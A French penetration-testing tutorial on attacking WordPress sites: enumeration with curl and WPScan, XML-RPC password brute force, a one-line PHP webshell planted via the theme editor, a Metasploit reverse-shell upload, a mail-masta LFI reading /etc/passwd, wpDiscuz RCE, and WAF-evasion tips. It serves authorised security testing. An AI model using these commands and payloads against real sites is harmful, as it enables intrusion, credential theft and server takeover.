# Attaquer WordPress

WordPress represente pres de 70% des parts de marche des CMS. On le croise sur quasiment chaque pentest externe. Sa force (extensibilite via themes et plugins) est aussi sa faiblesse : 89% des vulnerabilites WordPress connues proviennent des plugins. L'enumeration methodique de la version, des plugins et des utilisateurs est la cle pour identifier les vecteurs d'attaque.

## Pourquoi

WordPress est ecrit en PHP avec MySQL en backend, generalement heberge sur Apache. Son ecosysteme massif (plus de 50 000 plugins, 4 100 themes) en fait une cible de choix. Un plugin obsolete ou un identifiant faible sur le compte admin suffit pour obtenir un RCE sur le serveur sous-jacent.

## Comment ca marche

### Identification

Plusieurs indicateurs revelent la presence de WordPress :

- Le fichier `/robots.txt` contient des references a `/wp-admin/` et `/wp-content/`
- La balise `<meta name="generator" content="WordPress X.X">` dans le code source
- La page de login accessible a `/wp-login.php`
- La structure des repertoires `/wp-content/plugins/` et `/wp-content/themes/`

```bash
# - Confirmer WordPress et sa version
curl -s http://<IP_CIBLE>/ | grep WordPress
```

### Enumeration manuelle

```bash
# - Identifier le theme en usage
curl -s http://<IP_CIBLE>/ | grep themes

# - Identifier les plugins installes
curl -s http://<IP_CIBLE>/ | grep plugins

# - Verifier le listing de repertoire
curl -s http://<IP_CIBLE>/wp-content/plugins/
```

Les fichiers `readme.txt` dans les repertoires de plugins revelent souvent la version exacte. La page de login permet d'enumerer les utilisateurs : un nom valide retourne "The password you entered is incorrect", un nom invalide retourne "The username is not registered".

### Enumeration avec WPScan

WPScan est l'outil de reference pour l'audit WordPress. Il combine detection passive et active pour identifier la version, les plugins, les themes et les utilisateurs.

```bash
# - Scan complet avec API WPVulnDB
wpscan --url http://<IP_CIBLE>/ --enumerate --api-token <TOKEN>

# - Enumeration de tous les plugins (pas seulement les vulnerables)
wpscan --url http://<IP_CIBLE>/ --enumerate ap
```

{% hint style="warning" %}
WPScan ne trouve pas tout. Sur un meme site, l'enumeration manuelle peut reveler des plugins que WPScan a manques. Toujours combiner les deux approches.
{% endhint %}

### Brute force d'identifiants

WPScan permet le brute force via deux methodes : `wp-login` (formulaire standard) et `xmlrpc` (API XML-RPC, plus rapide).

```bash
# - Brute force via XML-RPC
wpscan --password-attack xmlrpc -t 20 -U admin,john \
    -P /usr/share/wordlists/rockyou.txt --url http://<IP_CIBLE>/
```

XML-RPC (`/xmlrpc.php`) est actif par defaut sur la plupart des installations. Il permet aussi des attaques de type pingback et DDoS.

### Execution de code via l'editeur de theme

Avec un acces administrateur, on peut modifier le code PHP d'un theme directement depuis l'interface. La methode la plus discrete consiste a editer un theme inactif pour ne pas perturber le site principal.

1. Naviguer vers `Appearance` > `Theme Editor`
2. Selectionner un theme inactif (ex: Twenty Nineteen)
3. Editer un fichier peu utilise (ex: `404.php`)
4. Ajouter une ligne de webshell : `system($_GET[0]);`
5. Acceder au webshell via `/wp-content/themes/twentynineteen/404.php?0=id`

```bash
# - Verification du webshell
curl http://<IP_CIBLE>/wp-content/themes/twentynineteen/404.php?0=id
```

{% hint style="danger" %}
Toujours utiliser un nom de parametre non devinable (hash MD5 par exemple) pour eviter qu'un attaquant tiers exploite le webshell pendant l'audit. Noter le fichier modifie et le nettoyer apres l'exploitation.
{% endhint %}

### Exploitation avec Metasploit

Le module `wp_admin_shell_upload` automatise l'upload d'un plugin malveillant et l'execution d'un reverse shell :

```bash
# - Upload et execution automatique
use exploit/unix/webapp/wp_admin_shell_upload
set USERNAME admin
set PASSWORD motdepasse
set RHOSTS <IP_CIBLE>
set LHOST <IP_ATTAQUANT>
exploit
```

### Exploitation de plugins vulnerables

**LFI via mail-masta** (v1.0) : le parametre `pl` inclut des fichiers sans validation.

```bash
# - LFI sur le plugin mail-masta
curl -s http://<IP_CIBLE>/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

**RCE via wpDiscuz** (v7.0.4, CVE-2020-24186) : contournement du filtre MIME pour uploader un fichier PHP via les commentaires, sans authentification.

```bash
# - Exploitation wpDiscuz
python3 wp_discuz.py -u http://<IP_CIBLE> -p /?p=1

# - Execution de commandes via le webshell uploade
curl -s http://<IP_CIBLE>/wp-content/uploads/2024/01/webshell.php?cmd=id
```

## En pratique

```bash
# 1 - Confirmer WordPress et sa version
curl -s http://<IP_CIBLE>/ | grep -i wordpress

# 2 - Enumeration automatisee
wpscan --url http://<IP_CIBLE>/ --enumerate ap,at,u

# 3 - Enumeration manuelle des plugins
curl -s http://<IP_CIBLE>/ | grep plugins

# 4 - Brute force si XML-RPC actif
wpscan --password-attack xmlrpc -U utilisateurs.txt \
    -P passwords.txt --url http://<IP_CIBLE>/

# 5 - Exploiter (editeur de theme, plugin vulnerable ou Metasploit)
```

## Pieges et galeres

{% tabs %}
{% tab title="Enumeration" %}
- **Theme enfant** : WPScan peut identifier un theme enfant mais pas le theme parent. Verifier manuellement le `style.css` pour la relation parent/enfant
- **Plugins caches** : certains plugins ne chargent pas de ressources sur les pages publiques. L'enumeration aggressive (`--enumerate ap --plugins-detection aggressive`) envoie des requetes directes vers les repertoires de plugins connus
- **Faux negatifs** : un plugin peut etre present dans le repertoire mais desactive. Il reste accessible et exploitable
{% endtab %}
{% tab title="Exploitation" %}
- **Editeur desactive** : certains administrateurs desactivent l'editeur de theme via `define('DISALLOW_FILE_EDIT', true)` dans `wp-config.php`. Dans ce cas, tenter l'upload de plugin
- **Permissions de fichiers** : le webshell ne fonctionnera pas si le repertoire `/wp-content/themes/` n'est pas accessible en ecriture par le serveur web
- **WAF** : les WAF detectent les patterns de webshell courants (`system(`, `exec(`). Utiliser des fonctions alternatives comme `passthru()` ou un obfuscateur
{% endtab %}
{% endtabs %}

## Retour terrain

WordPress est la cible la plus frequente en pentest externe. Le reflexe : scanner avec WPScan, tester les identifiants faibles (`admin:admin`, `admin:password`), et enumerer les plugins. Les plugins oublies et jamais mis a jour sont la source de compromission la plus courante.

En interne, on trouve souvent des WordPress de test ou de dev avec les identifiants par defaut. Ces instances sont rarement maintenues et accumulent les vulnerabilites.

L'enchainement classique : identifier un utilisateur valide via l'enumeration, brute forcer son mot de passe, acceder a l'editeur de theme, deposer un webshell, pivoter vers le reseau interne.

## Memo express

| Technique | Outil / Commande | Prerequis |
|---|---|---|
| Fingerprint | `curl` + grep, source HTML | URL du site |
| Scan complet | `wpscan --enumerate` | URL du site |
| Brute force | `wpscan --password-attack xmlrpc` | Utilisateurs valides |
| RCE (admin) | Editeur de theme 404.php | Acces admin WP |
| RCE (admin) | `wp_admin_shell_upload` (MSF) | Identifiants admin |
| LFI | Plugin mail-masta v1.0 | Plugin installe |
| RCE (unauth) | wpDiscuz v7.0.4 | Plugin installe |

***
